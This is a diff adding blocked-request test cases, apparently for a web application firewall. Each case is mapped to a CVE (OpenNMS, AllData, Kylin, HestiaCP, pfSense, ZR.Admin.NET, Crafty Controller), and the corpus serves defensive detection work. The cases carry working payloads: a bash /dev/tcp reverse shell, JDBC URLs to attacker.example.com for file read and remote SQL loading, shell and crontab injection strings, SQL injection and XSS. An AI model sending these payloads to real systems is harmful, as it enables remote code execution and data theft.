@@ -1276,6 +1276,89 @@ POST /management header="Content-Type: application/json" body="{\"operation\":\"
 #     re.search gadget reaches __globals__ to run Python code. ---
 POST /dumper/configure header="Content-Type: application/json" body="{\"filter\":\"search.__globals__['__builtins__']['__import__']('os').system('id')\"}"
 
+# --- CVE-2026-111235 (OpenNMS Meridian / Horizon): the /rest/** Spring
+#     Security filter chains compare the HTTP method case-sensitively and have
+#     no terminal deny rule, so a lowercase or mixed-case method token matches
+#     no rule and the request is served without authentication. Kunato rejects
+#     case variants of standard methods before rule evaluation. ---
+get /rest/nodes
+Get /rest/roles
+pOsT /rest/events
+
+# --- CVE-2026-111613 (AllData), CVE-2026-68571 (Apache Kylin): a
+#     caller-supplied JDBC URL reaches a datasource test endpoint unauthenticated;
+#     allowLoadLocalInfile and autoDeserialize turn the connection into arbitrary
+#     file read, and the H2 INIT parameter runs attacker SQL at connect time.
+#     The jdbc-injection rules block the dangerous parameter shapes; benign
+#     datasource URLs keep passing. ---
+POST /data-dts/jobJdbcDatasource/test header="Content-Type: application/json" body="{\"jdbcUrl\":\"jdbc:mysql://attacker.example.com:3306/db?allowLoadLocalInfile=true&allowUrlInLocalInfile=true\",\"jdbcDriverClass\":\"com.mysql.cj.jdbc.Driver\"}"
+POST /data-dts/jobJdbcDatasource/test header="Content-Type: application/json" body="{\"jdbcUrl\":\"jdbc:mysql://attacker.example.com:3306/db?autoDeserialize=true\",\"jdbcDriverClass\":\"com.mysql.cj.jdbc.Driver\"}"
+POST /data-dts/jobJdbcDatasource/test header="Content-Type: application/json" body="{\"jdbcUrl\":\"jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://attacker.example.com/pwn.sql'\",\"jdbcDriverClass\":\"org.h2.Driver\"}"
+
+# --- CVE-2026-111627 (HestiaCP): a non-ROOT panel administrator impersonates
+#     the protected ROOT_USER and writes cron entries through POST /add/cron/;
+#     the documented reverse-shell payload is caught by
+#     command-injection.bash-dev-tcp. ---
+POST /add/cron/ header="Content-Type: application/x-www-form-urlencoded" body="ok=1&v_min=*&v_hour=*&v_day=*&v_month=*&v_wday=*&v_cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F203.0.113.9%2F4444%200%3E%261%22"
+
+# --- pfSense CE leftovers (CVE-2026-111214 .. CVE-2026-111223,
+#     CVE-2026-111226; abraxaslabs PoC series): WebGUI fields reach shell,
+#     crontab, and php.ini sinks unescaped. Each request carries the documented
+#     parameter with a shell metacharacter, injected directive, or crontab
+#     newline. ---
+POST /system_advanced_admin.php header="Content-Type: application/x-www-form-urlencoded" body="sshguard_threshold=25%0ABACKEND%3D/bin/sh%20/tmp/x"
+POST /interfaces_ppps_edit.php header="Content-Type: application/x-www-form-urlencoded" body="ptpid=1%0A*%20*%20*%20*%20*%20root%20/bin/sh%20/tmp/x%0A"
+POST /services_pppoe_edit.php header="Content-Type: application/x-www-form-urlencoded" body="username=user%0A!%20/bin/sh%20/tmp/x&password=x"
+POST /interfaces_qinq_edit.php header="Content-Type: application/x-www-form-urlencoded" body="if=eth0;id&descr=lab"
+POST /interfaces_wireless_edit.php header="Content-Type: application/x-www-form-urlencoded" body="if=ath0;id"
+POST /firewall_virtual_ip.php header="Content-Type: application/x-www-form-urlencoded" body="vhid=1$(id)&type=carp&subnet=24"
+POST /firewall_shaper_vinterface.php header="Content-Type: application/x-www-form-urlencoded" body="number=1;id&name=lab"
+POST /system_gateways_edit.php header="Content-Type: application/x-www-form-urlencoded" body="gateway=lab&monitor=fe80::1%eth0;id"
+POST /system.php header="Content-Type: application/x-www-form-urlencoded" body="timezone=UTC%22%0Aauto_prepend_file=/tmp/x%0A&hostname=lab"
+POST /vpn_l2tp.php header="Content-Type: application/x-www-form-urlencoded" body="radius_secret=x%22%20set%20iface%20up-script%20/bin/sh%20/tmp/x&l2tp_enable=on"
+POST /vpn_ipsec_mobile.php header="Content-Type: application/x-www-form-urlencoded" body="login_banner_enable=on&login_banner=Welcome%20}%20charon.start-scripts%20=%20/bin/sh%20/tmp/x"
+
+# --- CVE-2026-111669 (ZR.Admin.NET): PagerInfo.Sort reaches an ORDER BY
+#     clause unchecked; the stacked-query and blind-inference shapes are
+#     stopped by sql-injection. ---
+GET /system/user/list?PagerInfo.Sort=name%3BSELECT%20pg_sleep(5)--
+GET /system/user/list?PagerInfo.Sort=1,(select%20case%20when(substr(password,1,1)=char(97))%20then%201%20else%201/0%20end)
+
+# --- CVE-2026-18516 (Crafty Controller): the audit log renders request
+#     headers without escaping, so a script payload in any header is stored
+#     XSS when an administrator opens the log; xss matches header values. ---
+GET /api/v2/servers header="User-Agent: <script>alert(document.domain)</script>"
+GET /api/v2/servers header="Referer: <img src=x onerror=alert(1)>"
+
+# 2026-10-18 candidates with no expressible request line:
+# CVE-2026-19863 (Jetty EthereumAuthenticator): the login path is matched with
+#   an unanchored substring search, so any protected path containing it is
+#   public. A generic rule cannot distinguish the exploit from ordinary login
+#   routes such as /admin/login, and the bypass depends on the configured
+#   login path; patch to 12.1.13.
+# CVE-2026-111229 (pfSense captiveportal HA): the shell metacharacters arrive
+#   in the XMLRPC response of the configured sync peer, not in the request.
+# CVE-2026-111224 (pfSense OpenVPN): the payload is the VPN username, off the
+#   HTTP surface.
+# CVE-2026-111231 (pfSense config restore/install): an authorization bypass
+#   with no request-side signature.
+# CVE-2026-63618 / CVE-2026-64959 / CVE-2026-108709 / CVE-2026-108743 /
+#   CVE-2026-64610 / CVE-2026-68573 (Apache Kylin): the advisories name no
+#   endpoint or parameter; patch to 5.0.5. CVE-2026-68571 is the JDBC URL
+#   component covered above.
+# CVE-2026-111093 (JetBrains Datalore report blob traversal): the advisory
+#   names no blob endpoint; patch to 2026.2.1.
+# CVE-2026-111389 (Frappe HRMS): the advisory names no endpoint.
+# CVE-2026-18661 (Jetty annotation constraint merge), CVE-2026-108082 /
+#   CVE-2026-109413 / CVE-2026-109449 (Symfony header/YAML/expression
+#   parsers), CVE-2026-104150 (AdonisJS slug matcher), CVE-2026-102475
+#   (Vert.x HTTP proxy body transformer): parser and resource-exhaustion flaws
+#   inside the framework; there is no stable request signature. Patch.
+# CVE-2026-95155 (Jackson 1.x nested JSON): depth exhaustion has no stable
+#   body signature; prefer patching or a body size limit.
+# CVE-2026-84731 (Nutanix Prism): the crafted internal management header is
+#   not published.
+
 # Classes that still need connection-level framing, a malicious upstream, or
 # configuration-specific state; no request line can express them.
 # CVE-2026-42533 (nginx): the HTTP variant needs a regex map and regex location
